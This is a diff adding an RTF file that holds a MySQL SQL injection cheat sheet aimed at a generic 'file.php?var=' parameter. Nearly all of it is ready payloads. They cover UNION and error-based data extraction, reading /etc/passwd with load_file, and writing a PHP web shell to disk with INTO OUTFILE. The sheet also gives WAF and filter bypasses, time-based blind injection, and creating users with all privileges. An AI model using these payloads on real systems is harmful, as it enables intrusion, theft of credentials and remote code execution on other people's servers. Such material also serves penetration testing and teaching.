@@ -1,0 +1,112 @@
+{\rtf1\ansi\ansicpg1252\uc1\deff0
+{\fonttbl{\f0\fmodern\fcharset0\fprq2 Courier New;}}
+{\colortbl;\red0\green0\blue0;\red255\green255\blue255;}
+\paperw12240\paperh15840\margl1800\margr1800\margt1440\margb1440\fet2\ftnbj\aenddoc
+\pgnrestart\pgnstarts0
+\pard\plain \fi720\ltrch\loch {\f0\fs24\b0\i0  CheatSheet: SQL Injection}
+\par\plain {\f0\fs24\b0\i0 Comments}
+\par\plain {\f0\fs24\b0\i0 /* \endash  Multi line comment.}
+\par\plain {\f0\fs24\b0\i0 # \endash  single line comment.}
+\par\plain {\f0\fs24\b0\i0 -- \endash  single line comment.}
+\par\plain {\f0\fs24\b0\i0 /*!*/ \endash  Mysql special comments.}
+\par\plain {\f0\fs24\b0\i0 Whitespaces.}
+\par\plain {\f0\fs24\b0\i0 +, %2B, %20, %09, %0d ,%0\loch\af0\hich\af0\dbch\af0\uc1\u1040\'3F, /**/, /*foo*/}
+\par\plain {\f0\fs24\b0\i0 Global system variables}
+\par\plain {\f0\fs24\b0\i0 @@datadir  // Mysql data directory.}
+\par\plain {\f0\fs24\b0\i0 @@version_compile_os -  //OS Mysql is running on.}
+\par\plain {\f0\fs24\b0\i0 @@version \endash  //Mysql database version.}
+\par\plain {\f0\fs24\b0\i0 user() \endash  //Current database user.}
+\par\plain {\f0\fs24\b0\i0 @@log_error \endash  //Path to error log.}
+\par\plain {\f0\fs24\b0\i0 database() \endash  //Current database.}
+\par\plain \f0\fs24\b0\i0
+\par\plain {\f0\fs24\b0\i0 The INFORMATION_SCHEMA database is made up of the following objects:}
+\par\plain \f0\fs24\b0\i0
+\par\plain {\f0\fs24\b0\i0 SCHEMATA}
+\par\plain {\f0\fs24\b0\i0 TABLES}
+\par\plain {\f0\fs24\b0\i0 COLUMNS}
+\par\plain {\f0\fs24\b0\i0 STATISTICS}
+\par\plain {\f0\fs24\b0\i0 USER_PRIVILEGES}
+\par\plain {\f0\fs24\b0\i0 SCHEMA_PRIVILEGES}
+\par\plain {\f0\fs24\b0\i0 TABLE_PRIVILEGES}
+\par\plain {\f0\fs24\b0\i0 COLUMN_PRIVILEGES}
+\par\plain {\f0\fs24\b0\i0 CHARACTER_SETS}
+\par\plain {\f0\fs24\b0\i0 COLLATIONS}
+\par\plain {\f0\fs24\b0\i0 COLLATION_CHARACTER_SET_APPLICABILITY}
+\par\plain {\f0\fs24\b0\i0 TABLE_CONSTRAINTS}
+\par\plain {\f0\fs24\b0\i0 KEY_COLUMN_USAGE}
+\par\plain {\f0\fs24\b0\i0 ROUTINES}
+\par\plain {\f0\fs24\b0\i0 VIEWS}
+\par\plain {\f0\fs24\b0\i0 TRIGGERS}
+\par\plain {\f0\fs24\b0\i0 PROFILING}
+\par\plain \f0\fs24\b0\i0
+\par\plain {\f0\fs24\b0\i0  }
+\par\plain \f0\fs24\b0\i0
+\par\plain {\f0\fs24\b0\i0 Columns in a SELECT.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 order by 10--      //Unknown column \loch\af0\hich\af0\dbch\af0\uc1\u8217\'9210\u8242\'27 in \u8216\'91order clause\u8217\'92}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 and(select * from table)=(1)--   //Operand should contain 9 column(s)}
+\par\plain {\f0\fs24\b0\i0 Encoding. //For matching collations.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select cast(version() as latin1)--  //5.0.11}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select convert(version() as binary)-- //5.0.11}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select aes_decrypt(aes_encrypt(version(),1),1)-- //5.0.11}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select unhex(hex(versions()))-- //5.0.11}
+\par\plain {\f0\fs24\b0\i0 File_priv.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select user()-- //Checking current user. root@localhost}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select file_priv from mysql.user where user=\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92root\u8217\'92--  //Checking for the file priveledge on current user, Y =Yes N=No.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select load_file(\loch\af0\hich\af0\dbch\af0\uc1\u8216\'91/etc/passwd\u8217\'92)--  // Loading system files.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 and+(select+1+from+(select+count(0),concat((select+load_file(\loch\af0\hich\af0\dbch\af0\uc1\u8216\'91/etc/passwd\u8217\'92),floor(rand(0)*2))+from+information_schema.tables+group+by+2+limit+1)a)--  // Loading system files with error based injection.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93<?php system($_GET[c]);?>\u8221\'94 into outfile \u8216\'91/dir/dir/shell.php\u8217\'92--  // Write code to a file.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 limit 1 into outfile \loch\af0\hich\af0\dbch\af0\uc1\u8216\'91/dir/dir/shell.php\u8217\'92 lines terminated by \u8220\'93<?php system($_GET[c]);?>\u8221\'94--+  //Write to a file.}
+\par\plain {\f0\fs24\b0\i0 WAF & security bypasses.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 /*!union*/ /*select*/ version()-- //MySQL comments.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 unUNIONion seleSELECTct version()-- //Filter bypass}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1/**/union/**/select/**/version()--  //Whitespace bypass}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 UnION SElecT version()--  //Mixed upper/lower}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 uni/**/on sel/**/ect version()-- //php comments.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 uni%6Fn select version()-- //URL encoding.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 %252f%252a*/union%252f%252a /select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--  //Taking advantage of a WAF that only decodes input once.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 0\loch\af0\hich\af0\dbch\af0\uc1\u215\'D7414141414141414141414141414141414141 union select version()--  //Buffer overflow.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select 0x3a3a3a--  //Encode to bypass magic quotes.}
+\par\plain {\f0\fs24\b0\i0 Extracting data from MySQL errors.}
+\par\plain {\f0\fs24\b0\i0 Rand()}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 or (select count(*)from(select 1 union select 2 union select 3)x group by concat(mid((select version() from information_schema.tables limit 1),1,64),floor(rand(0)*2)))--}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand(0)*2)) x from (select 1 union select 2)a group by x limit 1) --}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 or (select count(*) from table group by concat(version(),floor(rand(0)*2)))--}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 union select password from users where id=1 and row(1,1)>(select count(*),concat( (select users.password) ,0x3a,floor(rand()*2)) x from (select 1 union select 2 union select 3)a group by x limit 1) --}
+\par\plain {\f0\fs24\b0\i0 Name_const(Mysql 5.0.12 > 5.0.64)}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 or(1,2)=(select * from(select name_const(version(),1),name_const(version(),1))a)--}
+\par\plain {\f0\fs24\b0\i0 Extractvalue & updatexml (MySQL 5.1+)\line file.php?var=1 and extractvalue(rand(),concat(0x3a,version()))--  //Xpath error}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 and updatexml(rand(),concat(0x3a,version()))-- //Xpath error}
+\par\plain {\f0\fs24\b0\i0 Misc.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=(@:=1)or@ group by concat(@@version,@:=!@)having@||min(0)-- //Credits BlackFan.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=(@:=9)or@ group by left(@@version,@:=~@)having@||min(0)-- //Credits Blackfan.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 UNION SELECT * FROM (SELECT version() FROM information_schema.tables JOIN information_schema.tables b)a--}
+\par\plain {\f0\fs24\b0\i0 Injecting into an order byfile.php?var=(select if(substring(version(),1,1)=4,1,(select 1 union select 2)))--}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1,ExtractValue(1,concat(0x5c,(sele ct table_name from information_schema.tables limit 1)))--}
+\par\plain {\f0\fs24\b0\i0 Blind.}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 and IF(ASCII(SUBSTRING((SELECT version()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW())))-- //time based BSQLi}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 and IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3))-- //Time based BSQLi}
+\par\plain {\f0\fs24\b0\i0 file.php?var=1 AND (SELECT @a:=MID(BIN(FIND_IN_SET(MID(table_name,1,1), \loch\af0\hich\af0\dbch\af0\uc1\u8216\'91a,b,c,d,e,f\line ,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,1,2,3,4,5,6,7,8,9,_,!,@,#,\line $,%,^,&,*,(,),-,+,=,\\,,.,\u8221\'94,\\\u8217\'92,~,`,\\\\,|,\{,\},[,],:,;, ,\u8217\'92)),1,1) FROM in\line formation_schema.tables LIMIT 1)=@a AND IF(@a!=\u8221\'94,@a,SLEEP(5))--}
+\par\plain {\f0\fs24\b0\i0 If Statement SQL Injection Attack Samples}
+\par\plain {\f0\fs24\b0\i0 SELECT IF(user()='root@localhost','true','false') }
+\par\plain {\f0\fs24\b0\i0 Load File}
+\par\plain {\f0\fs24\b0\i0 ' UNION ALL SELECT LOAD_FILE('/etc/passwd') --}
+\par\plain {\f0\fs24\b0\i0 Create User}
+\par\plain {\f0\fs24\b0\i0 CREATE USER username IDENTIFIED BY 'password'; --}
+\par\plain {\f0\fs24\b0\i0 Drop User}
+\par\plain {\f0\fs24\b0\i0 DROP USER username; -- }
+\par\plain {\f0\fs24\b0\i0 Make user to DBA}
+\par\plain {\f0\fs24\b0\i0 GRANT ALL PRIVILEGES ON *.* TO username@'%'; }
+\par\plain {\f0\fs24\b0\i0 List Users}
+\par\plain \f0\fs24\b0\i0
+\par\plain {\f0\fs24\b0\i0     SELECT * FROM 'user' WHERE 1 LIMIT 0,30}
+\par\plain {\f0\fs24\b0\i0     SELECT * FROM mysql.user WHERE 1 LIMIT 1,1}
+\par\plain {\f0\fs24\b0\i0     SELECT * FROM mysql.user}
+\par\plain \f0\fs24\b0\i0
+\par\plain {\f0\fs24\b0\i0 Getting user defined tables SELECT table_name FROM information_schema.tables WHERE table_schema = 'tblUsers'}
+\par\plain {\f0\fs24\b0\i0 Getting Column NamesSELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tblUsers\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92tblUsers -> tablename}
+\par\plain {\f0\fs24\b0\i0 SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';}
+\par\plain {\f0\fs24\b0\i0 find table which have a column called 'username'}
+\par\plain {\f0\fs24\b0\i0 String without Quotes}
+\par\plain {\f0\fs24\b0\i0 SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))}
+\par\plain {\f0\fs24\b0\i0 This will return \loch\af0\hich\af0\dbch\af0\uc1\u8216\'91KLM\u8217\'92.}}
